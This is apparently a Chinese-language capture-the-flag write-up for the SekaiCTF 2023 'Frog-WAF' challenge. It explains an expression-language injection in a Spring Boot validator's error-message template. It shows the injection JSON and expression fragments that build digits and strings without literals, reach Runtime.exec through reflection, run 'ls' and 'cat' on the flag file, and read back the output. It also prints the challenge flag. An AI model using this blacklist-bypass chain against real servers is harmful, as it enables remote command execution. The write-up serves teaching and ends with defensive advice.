# Frog-WAF

## 题目简述

题目是 Spring Boot 联系人应用。`country` 字段由自定义 Bean Validation 校验器检查；当国家名无效时，程序把用户输入直接拼进约束消息模板。Hibernate Validator 会对模板中的 `${...}` 做 EL 插值，因此这里存在表达式注入。

主要难点是 Frog-WAF 的大小写敏感黑名单：它禁止引号、数字、算术符号，以及 `java`、`Runtime`、`class`、`Process` 等关键词。服务又没有外网，最终需要在表达式内部动态构造数字和字符串，通过反射执行命令并把输出写回校验错误。

## 解题过程

漏洞点位于 `CountryValidator.isValid`：

```java
if (!isValid) {
    String message =
        String.format("%s is not a valid country", input);
    constraintContext.disableDefaultConstraintViolation();
    constraintContext
        .buildConstraintViolationWithTemplate(message)
        .addConstraintViolation();
}
```

提交：

```json
{
  "firstName": "Aaa",
  "lastName": "Aaa",
  "description": "Aaa",
  "country": "${EXPRESSION}"
}
```

表达式结果会出现在 JSON 响应的 `violations[0].message` 中。HTTP 拦截器只看查询字符串，但校验器会再次检查 JSON 中的 `country`，所以仍需完全避开黑名单。

数字可以借助空列表的相同对象运算构造，不出现任何十进制字符：

```text
[].hashCode() mod [].hashCode()  -> 0
[].hashCode() div [].hashCode()  -> 1
```

更大的数可先生成任意长度字符串，再调用 `.length()`。字符串本身也不能写成字面量；官方解法先把若干方法对象转成字符串，并利用校验错误作为回显通道：

```text
${[].getClass().getDeclaredMethods()[INDEX].toString()}
```

其中 `INDEX` 同样用上述无数字表达式生成。方法签名字符串提供了字母、点号、空格等字符；之后用：

```text
.substring(start, end)
.toUpperCase()
.concat(other)
```

逐字符拼出 `java.lang.Runtime`、`java.util.Scanner`、`ls`、`cat ` 等敏感字符串。这样 WAF 检查原始输入时看不到这些连续关键词。

`[].getClass().getClass()` 可取得 `java.lang.Class` 对象。根据当前 JDK 11 的方法顺序，反射链的核心是：

```text
Class.forName("java.lang.Runtime")
     .getMethods()[getRuntimeIndex]
     .invoke(RuntimeClass)
     .exec(command)
     .getInputStream()
```

方法索引不要盲猜，可先逐项输出 `getDeclaredMethods()[i].toString()`，从回显中确定 `forName`、`getRuntime` 和 `Scanner(InputStream)` 构造器的位置。

为了回收完整命令输出，再动态加载 `java.util.Scanner`，用其 `InputStream` 构造器包装进程输出：

```text
ScannerClass
  .getDeclaredConstructors()[scannerIndex]
  .newInstance(processInputStream)
  .useDelimiter("AAA")
  .next()
```

先执行 `ls /` 获取随机化后的 `/flag-<32 hex>.txt` 文件名，再执行 `cat /flag-...txt`。整个结果作为 EL 插值内容出现在“不是有效国家”的错误消息中。

[公开解题记录](https://devme4f.github.io/posts/2023/sekaictf-2023_frog-waf/)还给出另一种回显方式：逐字节执行 `cut -c N`，读取 `InputStream.read()` 返回的整数，再在本地转回字符。该方法请求更多，但不依赖 `Scanner` 的方法顺序。比赛 flag 为：

```text
SEKAI{0h_w0w_y0u_r34lly_b34t_fr0g_wAf_c0ngr4ts!!!!}
```

## 方法总结

不要把用户输入作为 Bean Validation 消息模板；应使用固定模板和参数化变量，并关闭不需要的 EL 插值。关键词黑名单挡不住对象图遍历、反射和运行时字符串拼接，尤其不能依赖方法名与数字字面量过滤。分析这类题时，应先确认表达式结果是否回显，再依次解决“无数字索引、无字面量字符串、反射调用、命令输出回收”四个子问题。
